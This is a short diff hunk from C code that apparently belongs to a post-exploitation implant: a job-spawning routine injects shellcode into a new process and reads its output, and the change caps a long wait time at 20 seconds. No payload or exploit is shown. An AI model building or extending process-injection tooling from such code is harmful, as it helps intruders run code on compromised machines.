@@ -265,6 +265,8 @@ void command_job_spawn_logic(DWORD type, DWORD wait, DWORD offset, char * shellc
 	inject_process_logic(&pi, pi.hProcess, pi.dwProcessId, shellcode, slen, offset, parameter, plen);
 
 	/* wait the user specified time for our process to complete */
+	if (wait > 60000)
+		wait = 20000;
 	if (wait > 0) {
 		pipe_try(read_stdout, wait);
 	}
